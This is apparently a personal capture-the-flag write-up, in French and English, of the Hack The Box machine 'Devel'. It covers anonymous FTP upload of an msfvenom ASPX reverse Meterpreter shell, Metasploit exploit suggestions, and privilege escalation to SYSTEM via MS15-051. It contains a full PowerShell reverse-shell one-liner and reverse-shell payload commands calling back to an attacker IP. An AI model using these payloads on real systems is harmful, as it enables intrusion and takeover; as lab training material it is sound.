# HTB Devel 10.10.10.5


OS Name:                   Microsoft Windows 7 Enterprise 
OS Version:                6.1.7600 N/A Build 7600
No hotfix

ftp anonymous upload to c:\inetpub\wwwroot de IIS7
Upload meterpreter aspx payload (msfvenom)
MS10_015 ?? Pas reussi metasploit, .exe
ms15_051_client_copy_image : meterpreter : ok



## nmap
```
nmap -sC -sV 10.10.10.5
```
-> anonymous ftp
-> IIS 7


# ftp anonymous upload tst.htm

Le ftp permet d'uploader des fichiers directement dans le répertoire c:\inetpub\wwwroot de IIS7
```
cat tst.htm
hello

ftp 10.10.10.5
anonymous
put tst.htm
```

# ftp anonymous upload reverse meterpreter aspx

Generate meterpreter aspx shell
```
# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.30 LPORT=1234 -f aspx -o shell.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 341 bytes
Final size of aspx file: 2824 bytes
Saved as: shell.aspx
```

Et on l'upload
```
put shell.aspx
```

Note : test avec d'autres payload pour obtenir un nc
windows/powershell_reverse_tcp : rien ne se passe sur nc
windows/shell/reverse_tcp : Connection sur nc, puis plus rien


## meterpreter
```
msf > use exploit/multi/handler
msf exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(multi/handler) > set LHOST 10.10.10.5
LHOST => 10.10.10.5
msf exploit(multi/handler) > set LPORT 1234
LPORT => 1234
msf exploit(multi/handler) > exploit

[-] Handler failed to bind to 10.10.10.5:1234:-  -
[*] Started reverse TCP handler on 0.0.0.0:1234 
[*] Sending stage (179779 bytes) to 10.10.10.5
[*] Meterpreter session 1 opened (10.10.14.30:1234 -> 10.10.10.5:49164) at 2019-09-02 22:05:05 +0200

meterpreter > getuid
Server username: IIS APPPOOL\Web


meterpreter > shell
Process 580 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>systeminfo
systeminfo

Host Name:                 DEVEL
OS Name:                   Microsoft Windows 7 Enterprise 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          babis
Registered Organization:   
Product ID:                55041-051-0948536-86302
Original Install Date:     17/3/2017, 4:17:31 ��
System Boot Time:          5/9/2019, 9:27:16 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x64 Family 23 Model 1 Stepping 2 AuthenticAMD ~1996 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 5/4/2016
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     1.024 MB
Available Physical Memory: 737 MB
Virtual Memory: Max Size:  2.048 MB
Virtual Memory: Available: 1.542 MB
Virtual Memory: In Use:    506 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.5

c:\windows\system32\inetsrv>exit
exit
meterpreter > 
```

# post/multi/recon/local_exploit_suggester

```
background
> use post/multi/recon/local_exploit_suggester
msf post(multi/recon/local_exploit_suggester) > sessions

Active sessions
===============

  Id  Name  Type                     Information              Connection
  --  ----  ----                     -----------              ----------
  1         meterpreter x86/windows  IIS APPPOOL\Web @ DEVEL  10.10.14.30:1234 -> 10.10.10.5:49164 (10.10.10.5)

msf post(multi/recon/local_exploit_suggester) > options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION                           yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits

msf post(multi/recon/local_exploit_suggester) > set session 1
session => 1
msf post(multi/recon/local_exploit_suggester) > exploit

[*] 10.10.10.5 - Collecting local exploits for x86/windows...
[*] 10.10.10.5 - 40 exploit checks are being tried...
[+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The target service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The target service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The target service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The target service is running, but could not be validated.
[+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed
msf post(multi/recon/local_exploit_suggester) > 
```



# Exploit with MS10-015.exe
```
use exploit/windows/local/ms10_015_kitrap0d
set session 1
set LHOSTS 10.10.10.5
set LPORT 4446
exploit

Pas de session
...
```
KO


# Exploit with MS10-015.exe

wget https://github.com/SecWiki/windows-kernel-exploits/raw/master/MS10-015/MS10-015.zip
upload exploit with ftp
cd c:\inetpub\wwwroot
upload exploit with ftp, execute 
```
>vdmallowed.exe
vdmallowed.exe
--------------------------------------------------
Windows NT/2K/XP/2K3/VISTA/2K8/7 NtVdmControl()->KiTrap0d local ring0 exploit
-------------------------------------------- taviso@sdf.lonestar.org ---


[+] Spawning a shell to give SYSTEM token (do not close it)
[?] CreateProcess("C:\WINDOWS\SYSTEM32\CMD.EXE") => 2188
[?] GetVersionEx() => 6.1
[?] NtQuerySystemInformation() => \SystemRoot\system32\ntkrnlpa.exe@82855000
[?] Searching for kernel 6.1 signature { 64, a1, ... } ...
[+] Signature found 0xcde8d bytes from kernel base
[+] Starting the NTVDM subsystem by launching MS-DOS executable
[?] CreateProcess("C:\WINDOWS\SYSTEM32\DEBUG.EXE") => 2248
[?] OpenProcess(2248) => 0x2c
[?] Injecting the exploit thread into NTVDM subsystem @0x2c
[?] WriteProcessMemory(0x2c, 0x1040000, "VDMEXPLOIT.DLL", 14);
[?] WaitForSingleObject(0x38, INFINITE);
[?] GetExitCodeThread(0x38, 0012FF0C); => 0x77303074
[+] The exploit thread reports exploitation was successful
[+] w00t! You can now use the shell opened earlier
[+] Press any key to exit...

No in/out
KO
```
Je ne récupère pas la main, pb de shell ?
On tente avec un nc direct ?
Puis un powershell nishang


# use nc.exe -> nc : ko

Kali nc : cp /usr/share/windows-binaries/nc.exe .
une fois sous windows : This program cannot be run in DOS mode.

Get nc 32 bits : wget https://joncraton.org/files/nc111nt.zip, password nc
une fois sous windows : nc.exe -h fonctionne. Se connecte, mais pas d'interaction
\inetpub\wwwroot
KO

# use powershell oneliner -> nc : ko

powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.30',4446);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# Nishang: Invoke-PowerShellTCP.ps1 -> : ko




# exploit/windows/local/ms15_051_client_copy_image
```
> use exploit/windows/local/ms15_051_client_copy_image
> set session 1
> set LPORT 4445

> set LHOST 10.10.14.30
> exploit

[*] Started reverse TCP handler on 10.10.14.30:4445 
[*] Launching notepad to host the exploit...
[+] Process 2884 launched.
[*] Reflectively injecting the exploit DLL into 2884...
[*] Injecting exploit into 2884...
[*] Exploit injected. Injecting payload into 2884...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (179779 bytes) to 10.10.10.5
[*] Meterpreter session 2 opened (10.10.14.30:4445 -> 10.10.10.5:49164) at 2019-09-02 23:28:00 +0200

meterpreter > shell
Process 1652 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
nt authority\system

c:\Users\babis\Desktop>type user.txt.txt
type user.txt.txt
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx

c:\Users\Administrator\Desktop>type root.txt.txt
type root.txt.txt
xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```